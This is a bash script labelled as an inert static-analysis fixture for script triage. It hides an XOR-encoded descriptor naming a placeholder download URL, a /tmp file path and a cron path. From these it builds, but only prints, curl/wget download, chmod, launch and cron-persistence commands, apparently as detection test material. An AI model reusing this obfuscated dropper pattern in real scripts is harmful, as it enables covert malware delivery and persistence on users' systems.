#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_db8e098c='83,24,20,89,86,81,64,85,86,24,85,87,74,67,76,73,64,122,77,74,86,81,9,68,70,84,80,76,87,64,122,87,64,72,74,81,64,9,82,87,76,81,64,122,67,76,73,64,9,70,77,68,75,66,64,122,72,74,65,64,9,65,76,86,85,68,81,70,77,122,85,87,74,70,64,86,86,89,68,65,68,85,81,64,87,24,82,66,64,81,122,68,87,70,77,122,67,68,73,73,71,68,70,78,89,86,81,68,66,64,122,70,74,80,75,81,24,16,89,70,68,72,85,68,76,66,75,122,76,65,24,70,68,72,85,68,76,66,75,8,29,23,17,18,67,17,71,20,70,22,89,80,87,73,24,77,81,81,85,86,31,10,10,29,23,17,18,67,17,71,20,70,22,11,64,93,68,72,85,73,64,11,76,75,83,68,73,76,65,10,67,65,20,71,64,18,20,70,11,86,77,89,80,86,64,87,122,68,66,64,75,81,24,109,80,75,81,87,64,86,86,105,68,71,10,29,23,17,18,67,17,71,20,70,22,89,67,76,73,64,122,85,68,81,77,24,10,81,72,85,10,77,80,75,81,87,64,86,86,8,70,68,70,77,64,10,11,86,81,68,66,64,8,29,23,17,18,67,17,71,20,70,22,89,68,87,70,77,122,85,87,74,71,64,24,80,75,68,72,64,8,72,89,86,64,87,83,76,70,64,122,75,68,72,64,24,80,85,65,68,81,64,8,29,23,17,18,67,17,71,20,70,22,11,86,64,87,83,76,70,64,89,70,87,74,75,122,85,68,81,77,24,10,64,81,70,10,70,87,74,75,11,65,10,80,85,65,68,81,64,8,29,23,17,18,67,17,71,20,70,22'
  readonly Codec_db8e098c='decimal_comma|single_byte_xor|25'

  Load_db8e098c() {
    EnCoDeD_Bytes=()
    local IFS=','
    read -r -a EnCoDeD_Bytes <<< "${Material_db8e098c}"
  }

  Decode_db8e098c() {
    DeCoDeD_Bytes=()
    local InDeX
    for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
      DeCoDeD_Bytes+=("$((EnCoDeD_Bytes[InDeX] ^ 37))")
    done
  }

  Recover_db8e098c() {
    local -a EnCoDeD_Bytes DeCoDeD_Bytes
    local DeScRiPtOr_Text NeUtRaL PaSs InDeX
    NeUtRaL=$((19 * 7 - 133))
    Load_db8e098c
    PaSs=0; while ((PaSs < 1)); do Decode_db8e098c; ((PaSs+=1)); done
    DeScRiPtOr_Text=''
    local octal character
    for InDeX in "${!DeCoDeD_Bytes[@]}"; do
      printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
      printf -v character '%b' "\\$octal"
      DeScRiPtOr_Text+="$character"
    done
    printf '%s\n' "$DeScRiPtOr_Text"
  }

  Inspect_db8e098c() { local recovered; recovered="$(Recover_db8e098c)"; printf '%s\n' "$recovered"; }

  Plan_db8e098c() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_db8e098c)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_db8e098c; fi
